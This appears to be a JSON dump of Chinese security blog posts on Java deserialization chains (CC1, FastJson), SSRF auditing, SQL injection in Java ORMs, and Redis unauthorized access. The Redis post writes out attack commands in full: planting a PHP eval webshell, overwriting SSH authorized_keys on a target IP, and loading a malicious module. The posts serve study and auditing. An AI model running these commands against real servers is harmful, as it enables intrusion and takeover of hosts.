[{"title":"Java设计模式-静/动态代理","date":"2025-02-06T06:22:01.134Z","url":"/2025/02/06/%E9%9D%99%E6%80%81%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","tags":[["Java设计模式","/tags/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"Java静态代理Java静态代理是 Java中的一种设计模式。静态代理就是通过一个代理对象来间接访问真实对象。代理类会“代理”真实类的行为，可以在代理类中添加额外的功能或逻辑（例如日志、性能监控等），而不需要修改真实类的代码。 首先定义一个接口 subject： 实现类 SubjectImpl实现接口中的 request()方法： 静态代理类，代理真实的请求，加上了一些额外的处理逻辑 (更新日志等)： 客户类 Client使用静态代理的模式调用 request()方法： 静态代理的好处是在不修改真实类 (subjectImpl) 的前提下，为 (request) 方法增加一些额外的功能，比如日志、缓存等。 Java动态代理Java动态代理也是一种设计模式，由 Java JDK提供，可以减少很多重复代码，提高效率。 当 Subject接口中只有一种方法时，静态代理看起来还不错，但当 Subject接口中需要实现多种方法时，静态代理会使代码庞杂冗余： 这种情况下使用动态代理。 InvocationHandler (调用处理器) 接口 -&gt; 通过反射机制 (invoke方法) 动态代理对象： 定义 SubjectInvocationHandler类通过反射进行动态代理： 客户端通过 Proxy.newProxyInstance创建动态代理对象，分别接收三个参数。 (1) ClassLoader loader 类加载器 (不影响 invoke的执行)。 (2) Class&lt;?&gt; [] interfaces 被代理的接口(s) - 数组，若指定了 interfaces，代理对象都被视为实现了 interfaces接口，调用 Interfaces接口时，都会先经过 InvocationHandler.invoke()方法。 (3) InvocatonHandler h 调用处理器对象，重写定义了 invoke()方法。 动态代理中的命令执行当 SubjectInvocationHandler.invoke()方法中存在危险函数&#x2F;逻辑缺陷： 可以利用 Map接口调用 put方法触发 SubjectInvocationHandler.invoke()： "},{"title":"Commons-Collections-CC1链分析","date":"2025-02-05T03:10:18.404Z","url":"/2025/02/05/CC1%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["Java-Commons-Collections","/tags/Java-Commons-Collections/"]],"categories":[["Java-Commons-Collections","/categories/Java-Commons-Collections/"]],"content":"调试环境配置复现环境：jdk1.8.0_65 (&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;jdk1.8.0_65.jdk&#x2F;Contents&#x2F;Home) ​ .java源码 (&#x2F;Users&#x2F;gehansheng&#x2F;Desktop&#x2F;Java代码审计&#x2F;CC链&#x2F;CC1&#x2F;jdk-af660750b2f4 ​  仓库中下载 JDK源码包 ​ Commons-Collections 3.2.1 原安装的 jdk文件夹中的多为 .class反编译后的文件，代码不易阅读和调试，替换为 .java源码文件即可。 src&#x2F;share&#x2F;classes 中保存着 Java标准库源码 同理，使用 maven导入 Commons-Collections依赖的时候，maven添加的也是编译后的 .class文件，手动下载源代码即可： 完整EXP EXP构造逻辑正常使用 Java反射实现RCE逻辑不做赘述 (1) Commons-Collections 3.2.1中，存在核心接口 Transformer，是一种对象转换的机制，用于将一个输入对象转换为另一个输出对象。 (2) InvokerTransformer类实现了 Transform方法，可以通过反射调用输入对象的方法： (3) InvokerTransformer中的 transform方法在 TransformedMap的 checkSetValue方法中被调用： ![image-20250205162426065](&#x2F;Users&#x2F;gehansheng&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250205162426065.png) 若 valueTransformer的值可控，则可以实现命令执行。 valueTransformer的值在构造函数 TransformedMap中被定义： 但 TransformedMap构造函数的属性为 protected，protected属性修饰的方法只能被当前类&#x2F;子类调用，所以需要找一个当前类&#x2F;子类中调用了 TransformedMap构造方法的 public方法。 当前类 public方法 decorate调用了构造方法 TransformedMap： 由此 valueTransformer可控： (4) 继续向上找 checkSetValue方法在哪里被调用，TransformedMap父类 AbstractInputCheckedMapDecorator中的 MapEntry类中的 setValue方法调用了它： 使用 for循环遍历 transformedMap中的键值时，调用 setValue方法，进而触发 checkSetValue方法实现命令执行 (5) setValue方法在 AnnotationInvocationHandler.readbject方法中被调用，同样是遍历 Map的场景，这条链子大致就齐了： memberValues的值需可控，类 AnnotationInvocationHandler和其构造方法未使用任何访问修饰符进行修饰，只有同一包中的类可以进行访问调用。 故使用反射进行调用： type的属性是一种 Class泛型，Annotation是 Java中所有注解类的父类，所以 type需要赋值一种注解类。 几处需要注意的 gadget1、Runtime类没有实现 java.io.Serializable接口，不能被序列化和反序列化，需要使用反射来配合 InvokerTransformer构造。 正常反射调用 Runtime.getRuntime().exec()： 配合 InvokerTransformer： 可以利用类 ChainedTransformer中 transform方法可以递归调用 InvokerTransformer方法： 2、AnnotationInvocationHandler.readObject的执行逻辑到达 memberValue.setValue之前，需要经过两个 if条件： 断点调试 readObejct的步进逻辑可知，首先使用 annotationType获取注解 Override，接着使用 annotationType.memberTypes获取注解成员，键为注解成员的值，值为注解成员的类型。 最后判断注解成员是否和memberValue的键值相同，相同则不为 null，通过 if判断。 但 Override.class中无成员，所以更换为 Target.class，并修改 hashMap中传入的键值： 3、最后需要确保 setValue的值可控，虽然 AnnotationInvocationHandler.readObject中已经确定了 setValue的值，但可以利用 ConstantTransformer类修改。 ConstantTransformer.transform无论输入数据是什么，都返回常量 iConstant，iConstant在构造函数中被赋值，利用 ConstantTransformer和 ChainedTransformer可以控制 setValue值： CC1链流程图"},{"title":"浅谈Redis未授权攻击","date":"2025-01-27T11:13:18.216Z","url":"/2025/01/27/%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83/","tags":[["Redis未授权","/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"]],"categories":[["Redis未授权","/categories/Redis%E6%9C%AA%E6%8E%88%E6%9D%83/"]],"content":"Redis未授权访问利用条件： 1、redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 2、没有设置密码认证（一般为空），可以免密码远程登录redis服务。 未授权连接 redis-cli -h 101.xx.xx.xxx，并使用 info命令列出受害机 redis服务信息 Redis未授权 getshell利用 redis未授权写入 webshell实现 getshell。 利用前提：redis服务端存在 web服务器，且通过某种方式(phpinfo泄漏等)获得Web目录的根路径，且具有文件的读写权限，就可以利用 redis写入一句话木马 getshell。 1、将 redis工作目录修改至 Web根目录 config set dir /wwwroot/www/ 2、将 redis的数据文件名称(dbfilename)设置为 shell.php config set dbfilename shell.php 3、写入一句话木马shell config set payload &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; 4、保存 save 由此在网站根目录下写入一句话木马，使用蚁剑连接  利用 redis未授权写入 ssh公钥首先需要了解 ssh公钥认证机制： SSH 使用公钥认证来进行无密码登录。用户需要将自己的公钥添加到远程服务器的 ~/.ssh/authorized_keys 文件中，服务器会通过公钥验证用户的身份。如果公钥匹配，就可以成功登录。 利用 CONFIG SET 命令更改 Redis 配置 Redis 允许通过 CONFIG SET 命令更改配置，攻击者可以将 dir 配置更改为目标主机的 ~/.ssh 目录。这样，攻击者可以直接通过 SET 命令将数据写入该目录，覆盖 authorized_keys 文件，添加自己的 SSH 公钥。 首先在攻击机生成 ssh公钥并保存： ssh-keygen -t rsa 1、将 ssh公钥值写入到 redis键 pubKey中： cat /Users/gehansheng/.ssh/id_rsa.pub | redis-cli -h 101.42.13.105 -x set pubKey |（管道符）：将 cat 命令的输出传递给后续的命令 -x：表示从标准输入读取数据，并将数据作为值存储到 Redis。 2、将工作目录设置到 /home/ubuntu/.ssh config set dir /home/ubuntu/.ssh 3、将 redis的数据文件名称设置为 authorized_keys，这意味着 Redis 将数据存储在 /root/.ssh/authorized_keys 文件中，而不是默认的 dump.rdb 文件。 config set dbfilename authorized_keys 4、保存 save 但尝试使用 ssh免密连接时发现失败，查看写入的 authorized_keys文件，发现是由于公钥和 redis缓存中其他数据混合在一起导致的 修改命令，添加换行符，防止数据混淆 (echo -e &quot;\\n\\n&quot;; cat /Users/gehansheng/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ~/Desktop/key.txt 正确添加公钥后，便可使用 ssh公钥免密登录 ssh 1xx.xx.xx.xxx 配合 SSRF getshell当 redis服务绑定在 127.0.0.1时，只能从本地主机访问 redis服务端，此时无法从公网直接未授权访问并写入 shell了，但是可以利用 ssrf + gopher协议来写入 shell。 python脚本如下： 利用脚本生成 payload后打 ssrf即可。 ![image-20250202165210627]( Redis主从复制 getshell主从复制原理： 从节点 (slaver) 全量同步主节点 (Master) 的数据，同步过程中，主节点会生成一个RDB快照文件发送给从节点，从节点加载该RDB文件恢复数据。 getshell关键点： 从 Redis &gt;&#x3D; 4.0开始，主从复制的 RDB中可以包含模块(Module)的加载指令。如果攻击者伪装成主节点，向从节点发送包含恶意模块加载指令的RDB文件，从节点会自动加载并执行该模块。 Redis支持通过动态链接库(.so文件)来拓展功能，加载模块命令如下 module load /path/exp.so 自动化 RCE工具：  Exp.so payload: "},{"title":"浅谈Java中的SSRF审计","date":"2025-01-24T07:05:42.089Z","url":"/2025/01/24/%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84SSRF%E5%AE%A1%E8%AE%A1/","tags":[["SSRF","/tags/SSRF/"]],"categories":[["SSRF","/categories/SSRF/"]],"content":"前言前段时间面试某大厂安全实习生岗位时，被着重问到了 Java审计 SSRF漏洞时，需要重点关注哪些类 ? 我：我审计 SSRF时基本只关注一些关键字函数，没怎么关注过敏感类 😭😭😭 常出现的业务点SSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。 出现SSRF漏洞的主要业务有： (1) 通过URL地址分享网页内容 (2) 在线服务，外链文章翻译 (有道) (3) 通过URL地址加载或下载图片，PDF导出 (4) 加载远端配置 常见利用点http协议利用url =  file协议利用url =  总结不全，后续深入探究 ssrf打内网的利用。 重点审计类&#x2F;函数java.net.URL 和 java.net.URLConnectionservice层： Controller层： java.net.HttpURLConnection和Javax.net.ssl.HttpsURLConnection这两个类都是 java.net.URLConnection 的子类，分别用于处理 http和 https请求。 org.apache.http.client.methods.HttpGet和org.apache.http.client.methods.HttpPostApache HttpClient 是一个功能强大的 HTTP 客户端库，用于发送 HTTP 请求。 okhttp3.Request和okhttp3.OkHttpClient 除了建立 HTTP(s)协议连接，还可以直接通过 Socket建立连接，所以也要关注 Socket相关类。 java.net.Socketsocket.getInputStream().read() 和 socket.getInputStream().write() java.nio.channels.SocketChannelsocketChannel.connect() 总结： 修复方案 处理正确302跳转（在业务角度看，不能直接禁止302，而是对跳转的地址重新进行检查） 限制协议只能为http&#x2F;https，阻止跨协议 (如file协议，防止任意文件读取) 访问黑名单(禁止访问内网)，访问白名单(只允许访问白名单中的地址) 设置常见web端口白名单（防止端口扫描，可能业务设定比较大） 防御 SSRF中的 dns重绑定攻击 DNS重绑定攻击与防御绕过逻辑先对用户输入的 url进行一次 dns解析，判断其是否合法，若合法则继续进入到下一步逻辑中，伪代码如下所示： 通过 isValid()校验后，立即将 dns解析结果设置为服务器内网地址 (如 )，在服务器请求 url，第二次解析域名。此时已经过了ttl的时间，解析记录缓存IP被删除，所以重新进行 dns解析，解析结果为服务器内网地址，服务器请求内网数据并返回给攻击者： 解析记录缓存维持时间： 在传统的ssrf修复方案中，由于java会存在默认的dns缓存，所以一般认为java不存在DNS rebinding问题。但是试想这么一个场景，如果刚刚好到了DNS缓存时间，此时更新DNS缓存，那些已经过了SSRF Check而又没有正式发起业务请求的request，是否使用的是新的DNS解析结果。其实理论上只要在发起第一次请求后等到30秒之前的时候再请求即可，但为了保证效果，可以在28s左右，开始以一个较短的时间间隔去发送请求，以达到时间竞争的效果。 — 《SSRF安全指北》 修复方案 (final)由于 DNS重绑定攻击的存在，不得不设置一个更加全面的修复方案： 去除url中的特殊字符，限制协议为 http&#x2F;https 判断是否属于内网ip (黑名单) 如果是域名的话，将url中的域名改为ip - 防止dns rebinding，直接访问 ip不用二次进行dns解析 请求的url为3中返回的url 不跟随30x跳转（跟随跳转需要从1开始重新检测） "},{"title":"Hibernate框架中的SQL注入","date":"2025-01-21T03:24:22.726Z","url":"/2025/01/21/Hibernate%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","tags":[["SQL注入","/tags/SQL%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"前置概念：POJOPOJO (Plain Old Java Object) 是指 普通的 Java 对象，它没有继承自特定的类，也没有实现特定的接口。POJO 是一种简单的、符合 Java Bean 规范的 Java 类。可以把它理解成一个最普通的 JavaBean。 POJO 的特点是： 无特定继承：POJO 不需要继承自特定的父类，通常不继承任何框架类。 无特定接口：POJO 不需要实现任何特定的接口。 属性和方法：POJO 通常拥有一组私有属性，并提供公共的 getter 和 setter 方法来访问这些属性。 无框架依赖：POJO 不依赖于任何特定的框架或技术（如 EJB 等）。它是一个完全独立的 Java 类。 示例代码如下： 在 ORM框架中，POJO类通常用作映射数据库。 —————————————————————————————————————————————————— ORM框架ORM框架（Object-Relational Mapping Framework，面向对象与关系型数据库映射框架）是一种技术，它使得开发者能够在面向对象编程中使用对象来表示数据库中的数据，而不需要直接操作数据库中的表、行和列。ORM框架通过将对象的属性与数据库表中的字段相映射，实现了面向对象程序与关系型数据库之间的转换。 ORM的核心概念是将数据库中的表（table）、列（column）、映射到类（class）、和**对象（object）**的属性（field），使得开发者可以通过操作对象来进行数据库操作，而不必编写大量的SQL语句。ORM框架通过为开发者提供高级API，简化了数据库操作，自动生成SQL语句来完成对数据库的增、删、改、查操作。 工作原理 ORM框架通过映射关系将数据库表与程序中的类关联起来。通常包括以下几个步骤： 类映射：每个数据库表通常对应一个类，类的每个字段（属性）映射到表的每一列。类对象的操作会反映到数据库表的操作。 CRUD操作：开发者通过操作对象（增、删、改、查），ORM框架会自动将这些操作转换为相应的SQL语句，并执行这些SQL语句来操作数据库。 映射配置：ORM框架通常需要通过注解或XML配置文件指定类与数据库表之间的映射关系。 熟知的 ORM框架包括 Mybatis-plus，Hibernate等等。 —————————————————————————————————————————————————— JPAJPA（Java Persistence API）是一个用于 Java 平台上的对象关系映射（ORM）规范，它提供了一组标准化的接口和方法来简化 Java 应用程序与数据库之间的交互。JPA 使得 Java 开发者可以以面向对象的方式操作关系型数据库，并且与底层数据库的细节分离，避免了直接操作 SQL 语句。 JPA 本身并不是一个实现，而是一个规范。它定义了 Java 应用程序与关系型数据库交互的标准，开发者可以通过实现 JPA 规范的 ORM 框架（如 Hibernate、EclipseLink、OpenJPA）来使用 JPA 功能。 概念组成： 实体类（Entity）： 实体类是一个 Java 类，它代表了数据库中的一张表。每个实体类的实例代表该表的一行记录。实体类通常需要通过注解（如 @Entity）来标识，JPA 会根据这些实体类生成对应的数据库表。 持久化上下文（Persistence Context）： 持久化上下文是 JPA 管理实体的生命周期的容器。它负责跟踪所有已持久化实体的状态，并确保数据的一致性和持久性。持久化上下文与事务紧密结合。 实体管理器（EntityManager）： 实体管理器是 JPA 提供的一个接口，它用于管理实体对象的生命周期，执行对数据库的操作，如保存、更新、删除和查询。实体管理器是 JPA 操作数据库的核心接口。 查询语言（JPQL）： JPA 提供了一种面向对象的查询语言，称为 JPQL（Java Persistence Query Language）。JPQL 允许开发者使用面向对象的语法来执行数据库查询，而无需直接编写 SQL。JPQL 查询的是实体对象而不是数据库表。 注解（Annotations）： JPA 使用注解来描述实体类与数据库表之间的映射关系。例如，@Entity 用于标识实体类，@Id 用于标识主键，@Column 用于定义列映射等。 事务管理： JPA 提供了对事务的支持，确保操作的原子性。它可以与 JTA（Java Transaction API）进行集成，实现分布式事务控制。 JPA 常见注解： @Entity：用于标识一个类是实体类，映射到数据库表。 @Id：用于指定实体类的主键。 @GeneratedValue：用于指定主键的生成策略。 @Column：用于指定实体类属性和数据库列之间的映射关系。 @OneToMany、@ManyToOne、@ManyToMany、@OneToOne：用于定义实体类之间的关联关系。 @Table：用于指定数据库表的名称。 @Query：用于定义自定义的 JPQL 查询。 —————————————————————————————————————————————————— 搭建一个 SpringBoot. 3.x + Hibernate + HQL查询的项目Hibernate 是一个强大的 对象关系映射（ORM） 框架，它用于简化 Java 程序与关系型数据库之间的交互。ORM 的核心思想是将数据库表与 Java 对象进行映射，从而让开发者可以通过操作 Java 对象来实现对数据库的增、删、改、查等操作，避免了直接编写繁琐的 SQL 语句。个人感觉 Hibernate和 mybatis-plus的结构有些相似，都是使用了 ORM框架，但是 hibernate明显要更为复杂。 配置文件 pom.xml和 application.properties不做赘述。 (1) 首先创建 JPA实体类 person，对应的是数据库中的 person表： (2) 其次创建仓库接口，在 Spring Data JPA 中，可以通过继承 JpaRepository 来快速创建一个数据访问层接口。 JpaRepository 接口中提供了许多现成的数据库查询方法，比如 findById()方法，等等。如果提供的数据库查询方法无法满足需求，开发可以进行自定义。 使用默认的 findByUsername(String name)方法，数据库查询效果相当于 并且默认的查询方法使用了预编译，可以避免 sql注入。 (3) 除了使用默认提供的查询方法外，还可以使用 HQL构造查询语句来查询数据库，在服务层中使用： HQL（Hibernate Query Language，Hibernate 查询语言）是 Hibernate 框架中提供的一种查询语言，它与 SQL 类似，但 HQL 主要用于操作 Hibernate 实体对象而不是数据库表。HQL 使开发者能够使用面向对象的语法进行数据库查询，它是 Hibernate 框架特有的语言，旨在简化数据库操作，并减少对底层数据库表的直接依赖。 (4) 创建controller层，路由中使用服务层方法，启动项目，成功访问，得到数据库回显数据： HQL中的 sql注入参数直接拼接 HQL支持运行原生 SQL语句 - createNativeQuery()，若直接拼接参数会造成 sql注入： HQL中的预编译为了避免 SQL注入，HQL给出了几种参数绑定方式，即同理预编译的占位符。 (1) 命名参数占位 使用 : 后面跟输入参数的方式进行占位。 PS: 这个东西前段时间 京东面试的时候面试官问到了，当时只知道 ? 进行占位，完全没听说过冒号这个说法，现在看来是认知浅薄了。 占位符起到作用，进行了预编译： (2) 位置参数占位 效果同理，预编译，不做赘述。 (3) 列表占位 (in查询) 使用列表可以进行批量查询： 同样会进行预编译： "},{"title":"浅谈Java中的SQL注入","date":"2025-01-18T04:38:38.996Z","url":"/2025/01/18/%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","tags":[["SQL注入","/tags/SQL%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"环境Java: jdk_8u65 Mysql: 9.1.0 Mysql可视化：DBeaver 24.3.2 JDBCJDBC（Java Database Connectivity） 是一个 API（应用程序编程接口），用于 Java 应用程序与数据库之间的连接。它是直接用于数据库操作的接口，而不是介于应用程序和数据库之间的中间层。 1、Statement SQL语句拼接造成SQL注入 2、PreparedStatement 预编译使用不当预编译先编译 sql语句，无论后续用户输入如何，都作为字符串数据处理，而 sql注入只针对编译的过程进行破坏，所以预编译可以防御 sql注入。 并且还减少了 sql语句的编译次数，提高了性能。 正确的预编译语句如下所示： 但是预编译使用不当也会出现 sql注入。 (1) 未使用占位符，而是直接拼接虽然使用了预编译，但是没有使用 ? 进行占位，所以本质上还是直接拼接导致的 sql注入。 (2) in语句查询使用 in语句的场景有很多，比如收藏场景，勾选多篇文章，同时进行收藏，请求包可能如下所示： 当从数据库进行查询时，因为不清楚用户选中的文章的数量，开发可能会直接使用拼接的方式构造查询语句，导致sql注入。 修复： 可以先对用户传入的数据进行处理，确定对象的个数，根据个数增加占位符，再使用预编译。 比如 ‘取消收藏’的场景： (3) Like语句模糊查询有些业务会使用模糊查询，比如搜索框等场景 修复： 和 in语句类似，先对用户输入的数据进行判断，再添加占位符进行预编译： 但是 like的预编译并非百分百可靠，可以通过特殊字符 % 和 _ 来实现注入。 演示代码： 使用 % 和 _ 会导致返回所有结果，绕过预编译防御，所以要对 % 和 _ 进行过滤处理。 (5) Order by注入ORDER BY 是 SQL 中用于对查询结果进行排序的子句。它按照指定的列或表达式对数据进行升序（ASC）或降序（DESC）排列。默认情况下，ORDER BY 按升序排序。 正确的 order by查询使用如下所示： 其中 id为列名，意思是按照 id的大小进行生序排序。 但是预编译有一个特性，会强制给占位符所传入的数据加上 ‘’，’id’会被视为字符串而非列名，这样就不会按照预期进行排序。 所以在使用 JDBC连接的前提下想要使用 order by，就不能再使用预编译了，只能通过做好过滤，加WAF等方式来防御 sql注入。 MybatisMyBatis 是一款广泛使用的 Java 持久层框架，它通过将数据库操作与 Java 对象进行映射，简化了数据库操作的过程。MyBatis 允许开发者直接编写原生 SQL 查询语句，并通过 XML 或注解将 SQL 与 Java 方法进行映射，使得数据库操作更加灵活和高效。MyBatis 是一个 半自动化 的框架，开发者需要手动编写 SQL 语句，但它提供了映射功能，使得 SQL 查询结果可以直接映射为 Java 对象。 主要组件和原理SqlSessionFactory： SqlSessionFactory 是 MyBatis 的核心工厂类，负责创建 SqlSession 对象。它会根据全局配置文件（mybatis-config.xml）读取配置并初始化相关信息。 SqlSession： SqlSession 是 MyBatis 的核心接口，用于执行 SQL 查询、插入、更新、删除等操作。通过 SqlSession，你可以获取到映射器接口的代理对象，并执行相应的 SQL 操作。 Mapper 接口 Mapper 接口定义了数据库操作的方法，通常这些方法与 SQL 映射文件中的 SQL 标签一一对应。Mapper 接口通常由开发者编写，方法名与 XML 映射文件中的 id 匹配。 映射器 XML 文件 这个文件包含了 SQL 语句的定义，MyBatis 根据方法名称查找相应的 SQL 语句，并将查询结果映射成 Java 对象。 通过 id与 UserMapper接口中的方法名进行匹配。resultType指定数据库查询的结果会被映射到哪一个Java类，这里查询结果被映射到了 com.best.hello.entity.User类中。 Mybatis的两种传参方式${}: 将传入的参数直接拼接到 sql查询语句中，不做任何的处理。 #{}: 和预编译占位符异曲同工，先进性预编译后传参。将传入的数据都当作字符串，对传入的数据都加上双引号 “”。 (1) ${}直接拼接某些开发使用 Mybatis框架时，会使用 ${}传参导致 sql注入： 修复应使用 #{}： (2) in, Like查询like，in查询语句同理，使用 #{}即可。 Like: in: (3) Order by注入与 Jdbc同理，若使用 #{}会给传参加上双引号，导致列名被当作字符串解析，所以不得不使用 ${}，由此产生 sql注入。 Mapper接口： 映射器xml文件： 一个很好的修复方法是 ‘排序映射’，以我的理解，是一种类似于白名单的机制，严格限制用户输入： 用户的输入只能是 ‘id’ 和 ‘user’，若为其他直接使用默认排序，不再相信用户输入。 Mybatis-plusMybatis-Plus（简称MP）是基于MyBatis的增强工具，它简化了MyBatis的操作，提供了一些常用的功能，目的是让开发者在使用MyBatis时，能够更加高效、便捷地进行数据库操作。Mybatis-Plus不需要重写SQL语句，就能自动完成增、删、改、查等基本操作，减少了大量的代码重复性。 与 Mybatis不同，Mybatis-plus省去了 Mybatis所必需的映射器xml文件。 为了加深印象，我自己搭了一个使用 SpringBoot + Mybatis-plus的环境，添加依赖和数据库配置文件不多赘述。 Application.propertirs： 创建实体类 - 可以类比为 Mybatis中的 resultType： mapper层，继承 BaseMapper，BaseMapper中定义好了很多现成的 sql查询语句，供开发可以直接使用： service层：eq -&gt; equal的意思，即 where username &#x3D; username(用户输入) Controller层： 启动项目，即可连接数据库，进行查询操作： BaseMapper中提供的查询方法都使用了预编译来避免 sql注入。 (1) apply()直接拼接导致 sql注入 打印日志如图所示： 如上代码使用 apply()方法会将 username直接拼接到 sql查询语句中，不进行任何预处理，导致 sql注入。 修复方法很简单，apply()也有预编译： 使用 {0} 充当占位符，这样写可以达到预编译的效果，如下图打印日志所示： (2) last()使用不当在 MyBatis-Plus 中，last() 方法用于在 SQL 语句的末尾拼接自定义的 SQL 片段。这对于在查询中添加一些特定的 SQL 语句非常有用，比如排序、分页或其他一些自定义条件。 直接将 username拼接到 sql语句中，再去执行，造成 sql注入。 修复建议： 对用户的输入数据进行规范处理，采用过滤等操作，并且应尽量避免使用 last()。 (3) exists()和 notExists()使用不当：EXISTS 和 NOT EXISTS 常常用于查询中，需要根据某个条件是否存在来过滤数据。一般情况下，这类子查询会嵌套在 WHERE 子句中，判断某个数据是否满足特定条件。 业务场景： 比如有两个表 user 和 order，order 表中的每个订单都与 user 表中的某个用户相关联。如果你想查询那些有订单的用户，可以使用 EXISTS 子查询： 最终的查询语句为： 这个查询会返回那些有至少一个订单的用户。 notExists()同理。 但是如果直接拼接用户可控的输入就会造成 sql注入： 修复可以继续采用 {index}的方式： (4) having()使用不当having() 主要用于对分组后的数据进行条件过滤。在一些需要对聚合结果进行筛选的场景下，having() 非常有用。例如，计算销售总额、订单数量等指标，并对这些指标进行过滤。 比如：查询订单数量大于 10 的用户： 假设我们有一个 orders 表，包含 user_id 和 order_id 等字段。如果我们想查询订单数量大于 10 的用户，可以使用 having() 方法： 这个查询会生成如下 SQL： 但是如果直接拼接用户输入就会造成 sql注入： 类似的写法还有：只不过上面那个是字符型注入，下面这个是数字型注入罢了。 依然是 {idnex}即可避免注入： (5) order by注入orderBy(true, true, id) - 升序 orderBy(true, false, id) - 降序 orderByAsc() - 升序 orderByDesc() - 降序 order by注入与前面几种不同的是，order by不可以进行预编译，因为会强加上单引号，所以不能使用 {index}来进行修复了。 如果 order by 之后的数据用户可控，就存在 sql注入的风险。 时间盲注： (6) inSql()和 notInSql()使用不当：insql() 方法用于在 WHERE 子句中添加一个 IN 子查询条件。IN 子句会检查字段的值是否存在于由子查询返回的结果集中。 假设我们有一个 orders 表，想查询所有 user_id 在某些 order_id 查询结果中的用户。可以使用 inSql() 方法来构造这个查询： 生成的 SQL查询语句如下： 总结了一下，Mybatis-plus出现的 sql注入本质上仍然是未进行预编译的直接拼接导致的。还有一些文章将 wrapper自定义 sql语句导致注入 和 使用xml文件进行映射产生的注入单独拿出来说，我认为最终还是会归咎到上面几种注入中，所以不过多赘述了。"},{"title":"FastJson反序列化RCE分析","date":"2025-01-12T01:36:09.675Z","url":"/2025/01/12/FastJson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/","tags":[["FastJson","/tags/FastJson/"]],"categories":[["FastJson","/categories/FastJson/"]],"content":"前言影响版本：fastjson &lt;= 1.2.24描述：fastjson 默认使用 @type 指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter&#x2F;setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。此漏洞开启了 fastjson 反序列化漏洞的大门，为安全研究人员提供了新的思路。 fastjson &lt;&#x3D; 1.2.24 存在两条利用链： (1) jdbcRowSetImpl - JNDI注入 (2) TemplatesImpl fastjson 反序列化时的一些规则这里列举一些 fastjson 反序列化时对函数方法名和参数的一些要求： 使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的 class。 fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法， 其中 getter 方法需满足条件： 方法名长于 4 不是静态方法 以 get 开头且第 4 位是大写字母 方法不能有参数传入 继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong 此属性没有 setter 方法； setter 方法需满足条件： 方法名长于 4 以 set 开头且第 4 位是大写字母 非静态方法 返回类型为 void 或当前类 参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。 FastJson &lt;&#x3D; 1.2.24jdbcRowSetImpl链位置：com.sun.rowset.JdbcRowSetImpl#setAutoCommit 跟进 this.connect()方法： this.connect()方法中使用了 lookup()方法: dataSourceName值可控，存在JNDI注入： POC 利用场景： 其中 user输入用户可控。 TemplatesImpl链(条件苛刻)TemplatesImpl 起源 getter方法 getOutputProperties()，跟进 newTransformer()： 继续跟进 getTransletInstance()： 可以看到当 _class 的值为 null时会调用 defineTransletClasses()，跟进 defineTransletClasses()： 1、想进入 try{}代码模块。_bytecodes字节码数组不可以为 null。 2、加载的类的父类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，_transletIndex默认值为 -1，若加载类父类不是 AbstractTranslet，就会报错。 符合条件的类加载完成后，在 getTransletInstance()中进行实例化，实例化时会执行 静态初始化块的代码，从而RCE。 POC(参考 Y4er师傅) 1.2.25 &lt;&#x3D; FastJson &lt;&#x3D; 1.2.41使用 jdbc链时报错：autoType is not support. com.sun.rowset.jdbcRowSetImpl FastJson 在 1.2.25 ~ 1.2.41 版本中增加了 checkAutoType()，在获取 @type的值时对其进行检测： 跟进 com.alibaba.fastjson.parser.ParserConfig#checkAutoType autoTypeSupport 值默认为 false，使用黑白名单进行验证，若将 autoTypeSupport机制开启，即 autoTypeSupport &#x3D; true，即可无需白名单检测通过，也可以加载类： 但依然要绕过黑名单检测： 可以使用 loadClass()的特殊字符去除机制进行绕过(逻辑漏洞)： 类名开头为[会在类加载时去除，以 L开头;结尾也会在类加载时去除。 POC1、首先显示的开启 autoTypeSupport机制： ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 2、特殊字符绕过黑名单检测： 注：黑名单绕过是基于ParserConfig.getGlobalInstance().setAutoTypeSupport(true);的基础之上的。 FastJson 1.2.421.2.42 版本中的黑名单采用了 hash值的形式。 并且对传入的类进行了特殊字符处理，对开头的 L 和结尾的 ; 进行了一次去除，并重新将删除后的结果赋值className。但 loadClass()进行的是递归处理，所以可以双写绕过： POC FastJson 1.2.43修复双写绕过，若出现两个 L字符开头则直接抛出异常： 但是 [ 可以正常使用，使用 [绕过即可。 POC FastJson 1.2.44修复了 1.2.43中 [字符绕过的问题。 FastJson 1.2.45黑名单绕过。 POC FastJson 1.2.47 (重要)POC FastJson 1.2.47 是最为严重的一个漏洞。可以在不开启 autoTypeSupport的条件下实现RCE。 com.alibaba.fastjson.util.TypeUtils的静态代码块初始化调用 